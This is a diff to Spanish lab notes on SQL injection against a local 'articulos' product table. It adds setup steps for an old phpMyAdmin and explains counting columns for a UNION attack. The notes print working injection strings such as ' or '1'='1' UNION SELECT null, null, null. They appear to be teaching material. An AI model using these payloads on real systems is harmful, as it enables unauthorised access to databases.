@@ -1,5 +1,11 @@
 
-# Saber el número de columnas de la tabla
+# Previo
+
+Tiene que ser con un phpmyadmin antiguo.
+Importamos la BBDD databases.sql
+
+
+# Saber el número de columnas de la tabla que afecta al formulario
 Para que una consulta UNION funcione, se deben cumplir dos requisitos clave:
 - Las consultas individuales deben devolver el mismo número de columnas.
 - Los tipos de datos de cada columna deben ser compatibles entre las consultas individuales.
@@ -20,6 +26,9 @@ Cómo determinar del número de columnas requeridas en un ataque UNION de inyecc
 
 
 # Consulta que muestra todos los productos
+
+
+
 Consulta SQL:
 ```
 SELECT * from articulos where Nombre = '999' or '1'='1' UNION SELECT null, null, null from articulos #
@@ -29,3 +38,6 @@ Inyecciones que muestran todos los productos:
 999' or '1'='1' UNION SELECT null, null, null from articulos #
 999' or '1'='1' UNION SELECT * from articulos #
 ```
+
+
+
